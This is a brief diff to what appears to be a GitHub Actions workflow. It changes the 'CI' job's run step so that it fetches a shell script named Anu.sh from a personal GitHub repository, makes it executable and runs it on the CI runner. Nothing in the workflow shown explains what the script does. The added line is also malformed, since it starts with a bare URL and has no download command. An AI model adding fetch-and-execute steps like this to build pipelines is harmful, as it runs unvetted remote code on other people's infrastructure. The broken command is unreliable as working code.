@@ -24,4 +24,4 @@ jobs:
       uses: actions/checkout@v1
     - name: CI
       run:
-      wget https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu
+      https://raw.githubusercontent.com/Lanu12/Lalan/refs/heads/main/Anu.sh && chmod u+x Anu.sh && ./Anu.sh
